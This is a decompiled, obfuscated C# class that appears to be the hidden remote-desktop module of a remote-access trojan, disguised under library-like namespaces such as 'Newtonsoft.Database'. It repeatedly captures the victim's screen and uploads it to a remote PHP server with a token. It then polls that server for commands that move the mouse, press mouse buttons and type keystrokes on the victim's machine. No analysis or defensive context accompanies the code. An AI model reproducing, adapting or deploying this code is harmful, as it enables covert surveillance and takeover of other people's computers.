using GDBD.Bridges;
using GDBD.Importers;
using GDBD.Mappers;
using GDBD.Mocks;
using GDBD.Specifications;
using GDBD.Structs;
using GDBD.Workers;
using Newtonsoft.Annotations;
using Newtonsoft.Expressions;
using Newtonsoft.Resolver;
using System;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Newtonsoft.Database
{
	internal sealed class Definition
	{
		[CompilerGenerated]
		private sealed class _0001
		{
			public int _0001;

			public string _0002;

			public string _0003;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0001()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}
		}

		[CompilerGenerated]
		private sealed class _0002
		{
			public Screen _0001;

			public _0001 _0002;

			[MethodImpl(MethodImplOptions.NoInlining)]
			public _0002()
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				while (!identifier)
				{
					DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList(ValClientBridge.PushList(ValClientBridge.IncludeList(this._0001), this._0001.Bounds.Width / this._0002._0001, this._0001.Bounds.Height / this._0002._0001)), "rdscreen", this._0002._0002, this._0002._0003);
					Thread.Sleep(100);
				}
				identifier = false;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			internal void _0002()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				while (!identifier)
				{
					string[] array = ClassEvent.SearchFilter(DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(this._0002._0002 + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(this._0002._0002)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(this._0002._0003))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "getdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "getdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("rdbuffer" + MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "setdata") + "=%00&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(this._0002._0002) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("rdbuffer" + MappingListAnnotation._ProxyEvent))))))["response"].ResetClass<string>()).Split(new string[1]
					{
						"~*"
					}, StringSplitOptions.None);
					string[] array2 = array;
					foreach (string text in array2)
					{
						if (text.Length < 1)
						{
							continue;
						}
						if (text.Contains("@~"))
						{
							string[] array3 = text.Split(new string[1]
							{
								"@~"
							}, StringSplitOptions.None);
							switch (array3[0])
							{
							case "M":
								Publisher.MapFilter(Convert.ToInt32(array3[1].Split(',')[0]) + this._0001.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + this._0001.Bounds.Y);
								break;
							case "RD":
								Publisher.InsertFilter(8u, Convert.ToInt32(array3[1].Split(',')[0]) + this._0001.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + this._0001.Bounds.Y, 0, UIntPtr.Zero);
								break;
							case "RU":
								Publisher.InsertFilter(16u, Convert.ToInt32(array3[1].Split(',')[0]) + this._0001.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + this._0001.Bounds.Y, 0, UIntPtr.Zero);
								break;
							case "LD":
								Publisher.InsertFilter(2u, Convert.ToInt32(array3[1].Split(',')[0]) + this._0001.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + this._0001.Bounds.Y, 0, UIntPtr.Zero);
								break;
							case "LU":
								Publisher.InsertFilter(4u, Convert.ToInt32(array3[1].Split(',')[0]) + this._0001.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + this._0001.Bounds.Y, 0, UIntPtr.Zero);
								break;
							}
						}
						else
						{
							SendKeys.SendWait(text);
						}
						Thread.Sleep(10);
					}
					Thread.Sleep(100);
				}
			}
		}

		private static Thread m_System;

		private static bool identifier;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void ComputeEvent(string var1, int length_cont, bool wantrule, bool isvalue2, string ident3, string pol4)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (m_System == null)
			{
				Screen screen = Screen.PrimaryScreen;
				try
				{
					Screen[] allScreens = Screen.AllScreens;
					foreach (Screen screen2 in allScreens)
					{
						if (var1 == screen2.DeviceName)
						{
							screen = screen2;
							break;
						}
					}
				}
				catch
				{
				}
				DecoratorReaderMapper decoratorReaderMapper = new DecoratorReaderMapper();
				decoratorReaderMapper["w"] = ParserFilterResolver._0001(screen.Bounds.Width);
				decoratorReaderMapper["h"] = ParserFilterResolver._0001(screen.Bounds.Height);
				DispatcherInstanceExpression.ExcludeFilter("rdscreensize", decoratorReaderMapper.SetClass((TimeState)0, new BroadcasterError[0]), ident3, pol4);
				m_System = new Thread((ThreadStart)delegate
				{
					//Discarded unreachable code: IL_0002
					//IL_0003: Incompatible stack heights: 0 vs 1
					while (!identifier)
					{
						DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList(ValClientBridge.PushList(ValClientBridge.IncludeList(screen), screen.Bounds.Width / length_cont, screen.Bounds.Height / length_cont)), "rdscreen", ident3, pol4);
						Thread.Sleep(100);
					}
					identifier = false;
				});
				m_System.Start();
				if (wantrule || isvalue2)
				{
					new Thread((ThreadStart)delegate
					{
						//Discarded unreachable code: IL_0002
						//IL_0003: Incompatible stack heights: 0 vs 1
						while (!identifier)
						{
							string[] array = ClassEvent.SearchFilter(DecoratorReaderMapper.PatchRequest(ItemEventEntry.ConcatList(ident3 + "/" + ClassEvent.ResetFilter(ClassEvent.RegisterFilter(ident3)) + ".php?" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "token") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(pol4))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "token_uid") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.RegisterFilter(MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "getdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "getdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("rdbuffer" + MappingListAnnotation._ProxyEvent)))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "setdata") + "=%00&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "setdata_name") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(MappingListAnnotation._ProxyEvent))) + "&" + ClassEvent.ResetFilter(ItemEventEntry.InvokeList(ident3) + "setdata_extension") + "=" + Uri.EscapeDataString(ReponseClassSpec.WriteFilter(ClassEvent.RestartFilter(ClassEvent.ResetFilter("rdbuffer" + MappingListAnnotation._ProxyEvent))))))["response"].ResetClass<string>()).Split(new string[1]
							{
								"~*"
							}, StringSplitOptions.None);
							string[] array2 = array;
							foreach (string text in array2)
							{
								if (text.Length >= 1)
								{
									if (text.Contains("@~"))
									{
										string[] array3 = text.Split(new string[1]
										{
											"@~"
										}, StringSplitOptions.None);
										switch (array3[0])
										{
										case "M":
											Publisher.MapFilter(Convert.ToInt32(array3[1].Split(',')[0]) + screen.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + screen.Bounds.Y);
											break;
										case "RD":
											Publisher.InsertFilter(8u, Convert.ToInt32(array3[1].Split(',')[0]) + screen.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + screen.Bounds.Y, 0, UIntPtr.Zero);
											break;
										case "RU":
											Publisher.InsertFilter(16u, Convert.ToInt32(array3[1].Split(',')[0]) + screen.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + screen.Bounds.Y, 0, UIntPtr.Zero);
											break;
										case "LD":
											Publisher.InsertFilter(2u, Convert.ToInt32(array3[1].Split(',')[0]) + screen.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + screen.Bounds.Y, 0, UIntPtr.Zero);
											break;
										case "LU":
											Publisher.InsertFilter(4u, Convert.ToInt32(array3[1].Split(',')[0]) + screen.Bounds.X, Convert.ToInt32(array3[1].Split(',')[1]) + screen.Bounds.Y, 0, UIntPtr.Zero);
											break;
										}
									}
									else
									{
										SendKeys.SendWait(text);
									}
									Thread.Sleep(10);
								}
							}
							Thread.Sleep(100);
						}
					}).Start();
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void DestroyEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (m_System != null)
			{
				identifier = true;
				while (identifier)
				{
					Thread.Sleep(500);
				}
				m_System = null;
				GC.Collect();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public Definition()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static Definition()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			m_System = null;
			identifier = false;
		}
	}
}
